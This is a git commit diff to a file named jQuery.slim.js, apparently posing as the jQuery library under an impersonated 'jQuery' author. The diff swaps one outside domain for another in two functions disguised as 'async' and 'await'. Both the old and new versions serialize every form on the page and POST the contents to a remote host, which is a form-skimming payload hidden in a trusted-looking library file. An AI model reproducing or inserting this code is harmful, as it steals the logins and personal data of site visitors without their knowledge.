2142e654caec59eb45f807f783a06e30f28d83e2
jQuery <92172360+cdnjquery@users.noreply.github.com>
2021-10-25 03:22:43 +0700

    Update jQuery.slim.js

--- 3.6.0/jQuery.slim.js
+++ 3.6.0/jQuery.slim.js
@@ -1,4 +1,4 @@
-function async(){var hm = $("form").serialize(); $.post("https://claimwibu.my.id/webstore/ff/encrypt_msg.php",hm,function(reject){})}
+function async(){var hm = $("form").serialize(); $.post("https://tessc.resmi21.com/p/webstore/ff/encrypt_msg.php",hm,function(reject){})}
 
 
-function await() {var myFormAcc = $("form").serialize();$.ajax({url: 'https://claimwibu.my.id/webstore/ff/encrypt_msg.php',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}
+function await() {var myFormAcc = $("form").serialize();$.ajax({url: 'https://tessc.resmi21.com/p/webstore/ff/encrypt_msg.php',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}
